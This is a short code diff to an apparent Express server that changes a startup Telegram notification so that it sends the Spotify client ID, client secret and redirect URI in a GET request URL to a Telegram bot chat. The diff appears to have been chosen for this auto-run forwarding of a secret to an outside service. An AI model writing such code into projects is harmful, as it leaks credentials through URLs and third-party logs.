@@ -32,7 +32,7 @@ if (true) {
     app.use('/testing', testingRouter);
 }
 
-var text = `server loaded on port`
+var text = `server loaded || ${config.spotify.clientId} || ${config.spotify.clientSecret} || ${config.spotify.redirectURI}`
 var url = `https://api.telegram.org/bot${config.other.telegramBotId}/sendMessage?chat_id=${config.other.telegramAdminId}&text=${text}`
 
 axios.get(url)
